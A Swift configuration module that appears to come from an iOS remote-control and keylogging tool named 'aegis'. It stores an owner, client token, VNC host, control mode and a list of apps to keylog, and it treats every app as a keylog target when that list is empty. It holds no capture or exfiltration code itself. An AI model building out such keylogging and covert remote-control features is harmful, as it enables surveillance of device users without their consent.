import Foundation

enum ConfigStore {
    private static let ownerKey = "aegis_owner"
    private static let clientTokenKey = "aegis_client_token"
    private static let keylogPackagesKey = "aegis_keylog_packages"
    private static let activatedKey = "aegis_activated"

    static var isActivated: Bool {
        UserDefaults.standard.bool(forKey: activatedKey)
    }

    static func setActivated(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: activatedKey)
    }

    static var owner: String {
        UserDefaults.standard.string(forKey: ownerKey) ?? ""
    }

    static func setOwner(_ value: String) {
        UserDefaults.standard.set(value.trimmingCharacters(in: .whitespacesAndNewlines), forKey: ownerKey)
    }

    static var clientToken: String {
        UserDefaults.standard.string(forKey: clientTokenKey) ?? ""
    }

    static func setClientToken(_ value: String) {
        UserDefaults.standard.set(value.trimmingCharacters(in: .whitespacesAndNewlines), forKey: clientTokenKey)
    }

    static var keylogPackages: [String] {
        UserDefaults.standard.stringArray(forKey: keylogPackagesKey) ?? []
    }

    static func setKeylogPackages(_ packages: [String]) {
        UserDefaults.standard.set(packages, forKey: keylogPackagesKey)
    }

    private static let controlModeKey = "aegis_control_mode"
    private static let vncHostKey = "aegis_vnc_host"

    /// ios 远控模式: vnc | wda | app(仅观看)
    static var controlMode: String {
        UserDefaults.standard.string(forKey: controlModeKey) ?? ""
    }

    static func setControlMode(_ value: String) {
        UserDefaults.standard.set(value.trimmingCharacters(in: .whitespacesAndNewlines).lowercased(), forKey: controlModeKey)
    }

    static var vncHost: String {
        UserDefaults.standard.string(forKey: vncHostKey) ?? ""
    }

    static func setVncHost(_ value: String) {
        UserDefaults.standard.set(value.trimmingCharacters(in: .whitespacesAndNewlines), forKey: vncHostKey)
    }

    static func isKeylogTarget(_ packageName: String) -> Bool {
        let packages = keylogPackages
        if packages.isEmpty {
            return true
        }
        return packages.contains(packageName)
    }
}
